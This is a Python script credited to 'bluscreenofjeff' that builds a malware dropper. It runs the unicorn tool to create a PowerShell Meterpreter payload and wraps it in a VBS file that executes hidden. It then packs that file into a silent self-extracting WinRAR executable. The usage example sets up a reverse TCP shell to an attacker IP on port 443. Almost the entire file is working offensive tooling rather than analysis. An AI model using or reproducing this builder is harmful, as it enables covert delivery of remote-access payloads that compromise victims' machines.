#!/usr/bin/env python
#by bluscreenofjeff

import sys
from os import system, chdir #comes native

#filewrite
def filewrite(texttowrite,filetowriteto):
    f = open(filetowriteto, "a")
    f.write(texttowrite)
    f.close()

def write_xfs_config():
    f = open("xfs.config", "w")
    f.write(";The comment below contains SFX script commands\n")
    f.close()
    filewrite("\n","xfs.config")
    filewrite("Path=%Temp%\n","xfs.config")
    filewrite("Setup=run.vbs\n","xfs.config")
    filewrite("Silent=1\n","xfs.config")
    filewrite("Overwrite=1\n","xfs.config")

def exe_gen(payload,ipaddr,port):
    system("python /opt/unicorn/unicorn.py "+payload+" "+ipaddr+" "+port+"")
    f = open("run.vbs", "w")
    f.write("Dim shell,command\n")
    f.close()
    filewrite('command = "',"run.vbs")
    with open('powershell_attack.txt', 'r') as j:
        global first_line
        first_line = j.readline()
    filewrite(first_line,"run.vbs")
    filewrite('"\n',"run.vbs")
    filewrite('Set shell = CreateObject("WScript.Shell")\n',"run.vbs")
    filewrite('shell.Run command,0',"run.vbs")
    #create SFX archive with the new payload
    system("wine /root/.wine/drive_c/Program\ Files/WinRAR/Rar.exe a -r -u -sfx -z'xfs.config' powerpay run.vbs") 
    #remove the comment below to delete powershell_attack.txt during run
    #system("rm powershell_attack.txt")
    system("rm run.vbs")
    system("rm unicorn.rc")
    system("rm xfs.config")

# pull the variables needed for usage
try:

    payload = sys.argv[1]
    ipaddr = sys.argv[2]
    port = sys.argv[3]
    write_xfs_config()
    exe_gen(payload,ipaddr,port)

# except out of index error
except IndexError:

    print """
[!] Error
    
    Usage:
        python power_exe.py <payload> <ip address> <port>
	Example: python power_exe.py windows/meterpreter/reverse_tcp 192.168.1.5 443

    """